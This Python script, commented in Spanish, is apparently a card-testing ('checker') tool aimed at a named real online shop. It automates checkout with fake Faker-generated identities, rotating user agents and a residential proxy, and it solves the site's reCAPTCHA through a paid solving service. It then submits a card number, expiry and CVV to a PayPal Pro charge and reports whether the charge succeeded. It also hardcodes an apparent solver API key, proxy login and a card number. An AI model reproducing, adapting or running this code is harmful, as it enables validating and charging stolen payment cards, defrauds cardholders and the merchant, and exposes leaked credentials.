import httpx
import asyncio
import re
import traceback
import random
from faker import Faker

# === CONFIGURACIÓN GLOBAL ===
CAPSOLVER_KEY = "CAP-E628130ED40FD0A0BBC180D0C7822D2C3B13D9BAAE3152A7F7A15F473A4F852F" 
SITE_KEY = "6Le908oUAAAAAAYXOj9KeXt18sTzQ7JpQQ-6j8Fp"
PAGE_URL = "https://www.according2prophecy.org/Merchant2/merchant.mvc"

# === CONFIGURACIÓN DE PROXY ===
USE_PROXY = True 
PROXIES_LIST = [
    "http://b7e37b644dc5b6cb:VYdXQ67KAtfPgacU@res.proxy-seller.com:10000",
]

# === GENERADOR DE DATOS ===
fake = Faker('en_US')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
]

class ProphecyChecker:
    def __init__(self, cc_data, proxy_url=None):
        partes = cc_data.split('|')
        self.cc = partes[0]
        self.mes = str(int(partes[1]))
        self.ano = f"20{partes[2][-2:]}"
        self.cvv = partes[3]
        
        self.proxy = proxy_url if USE_PROXY else None
        self.ua = random.choice(USER_AGENTS)
        
        # Cliente optimizado: HTTP/1.1 para estabilidad con Proxies y Timeouts largos
        self.client = httpx.AsyncClient(
            verify=False, 
            follow_redirects=True, 
            http2=False, 
            timeout=httpx.Timeout(120.0, connect=60.0),
            proxy=self.proxy
        )
        self.sid = None

    async def solve_with_capsolver(self):
        print(f"[*] {self.cc[:6]} -> Solicitando Captcha...")
        payload = {
            "clientKey": CAPSOLVER_KEY,
            "task": {
                "type": "ReCaptchaV2TaskProxyless",
                "websiteURL": PAGE_URL,
                "websiteKey": SITE_KEY
            }
        }
        try:
            async with httpx.AsyncClient(timeout=60) as solver:
                r = await solver.post("https://api.capsolver.com/createTask", json=payload)
                task_id = r.json().get("taskId")
                if not task_id: return None

                for _ in range(30):
                    await asyncio.sleep(3)
                    status_resp = await solver.post("https://api.capsolver.com/getTaskResult", json={
                        "clientKey": CAPSOLVER_KEY,
                        "taskId": task_id
                    })
                    data = status_resp.json()
                    if data.get("status") == "ready":
                        print(f"✅ {self.cc[:6]} -> Captcha Resuelto.")
                        return data.get("solution").get("gRecaptchaResponse")
            return None
        except: return None

    async def run(self):
        try:
            # Generar datos frescos para cada intento
            f_name = fake.first_name()
            f_last = fake.last_name()
            f_street = fake.street_address()
            f_email = fake.email()
            # Teléfono formato USA aleatorio
            f_phone = f"{random.randint(200,999)}{random.randint(111,999)}{random.randint(1111,9999)}"

            headers = {
                "User-Agent": self.ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://www.according2prophecy.org",
                "Connection": "keep-alive"
            }

            # PASO 1: Carrito
            print(f"[*] {self.cc[:6]} -> [1/4] Iniciando sesión...")
            await self.client.get("https://www.according2prophecy.org/", headers=headers)
            r_prod = await self.client.get(f"{PAGE_URL}?Screen=PROD&Store_Code=ATPMB&Product_Code=SG-0002", headers=headers)
            
            sid_match = re.search(r'Session_ID=([a-f0-9]{32})', r_prod.text)
            if not sid_match: return "❌ Error: Session_ID no encontrado"
            self.sid = sid_match.group(1)
            
            await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Action": "ADPR", "Screen": "PROD", "Store_Code": "ATPMB",
                "Product_Code": "SG-0002", "Category_Code": "SG", "Quantity": "1"
            }, headers=headers)

            # PASO 2: OCST (Datos Faker)
            print(f"[*] {self.cc[:6]} -> [2/4] Enviando datos: {f_name} {f_last}")
            await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Action": "ORDR", "Screen": "OUSL", "Store_Code": "ATPMB",
                "ShipFirstName": f_name, "ShipLastName": f_last, "ShipEmail": f_email,
                "ShipPhone": f_phone, "ShipAddress1": f_street, "ShipCity": "New York",
                "ShipStateSelect": "NY", "ShipZip": "10025", "ShipCountry": "US"
            }, headers=headers)

            # PASO 3: OPAY
            print(f"[*] {self.cc[:6]} -> [3/4] Generando Token de Autorización...")
            card_type = 'VISA' if self.cc.startswith('4') else 'MCRD' if self.cc.startswith('5') else 'AMEX' if self.cc.startswith('3') else 'DISC' if self.cc.startswith('6') else 'VISA'
            
            r_opay = await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data={
                "Screen": "OPAY", "Action": "SHIP,PSHP,CTAX", "Store_Code": "ATPMB",
                "ShippingMethod": "flatrate:FREE Shipping", 
                "PaymentMethod": f"paypalpro:{card_type}"
            }, headers=headers)
            
            token_match = re.search(r'name="PaymentAuthorizationToken" value="([a-f0-9]{32})"', r_opay.text)
            if not token_match: return "❌ Error: Auth Token no generado"
            auth_token = token_match.group(1)

            # CAPTCHA
            captcha_key = await self.solve_with_capsolver()
            if not captcha_key: return "❌ Error: CapSolver Falló"

            # PASO 4: AUTH FINAL
            print(f"[*] {self.cc[:6]} -> [4/4] Enviando cobro...")
            headers["Referer"] = f"{PAGE_URL}?Session_ID={self.sid}&Screen=OPAY"
            
            final_data = {
                "Action": "AUTH", "Screen": "INVC", "Store_Code": "ATPMB",
                "PaymentAuthorizationToken": auth_token,
                "g-recaptcha-response": captcha_key,
                "PaymentMethod": f"paypalpro:{card_type}",
                "PaypalPro_CardNumber": self.cc,
                "PaypalPro_CardExp_Month": self.mes,
                "PaypalPro_CardExp_Year": self.ano,
                "PaypalPro_CardCvv": self.cvv
            }

            response = await self.client.post(f"{PAGE_URL}?Session_ID={self.sid}&", data=final_data, headers=headers)

            # ANALIZAR RESULTADO
            error = re.search(r'(Unable to authorize payment:.*?&#40;\d+&#41;)', response.text, re.DOTALL)
            if error:
                return error.group(1).replace('<br>', '').strip()
            elif "Thank you" in response.text:
                return "🔥 COMPRA EXITOSA (CHARGED)"
            else:
                miva_err = re.search(r'<b>\s*(.*?)\s*<br>', response.text, re.DOTALL)
                return miva_err.group(1) if miva_err else "⚠️ Respuesta desconocida"

        except Exception as e:
            return f"❌ Error: {str(e)}"
        finally:
            await self.client.aclose()

# --- PARA USO INDEPENDIENTE O INTEGRACIÓN ---
async def main():
    px = random.choice(PROXIES_LIST) if USE_PROXY else None
    checker = ProphecyChecker("5325617909029728|06|28|188", px)
    print(f"\n[ RESULTADO ]\n{await checker.run()}")

if __name__ == "__main__":
    asyncio.run(main())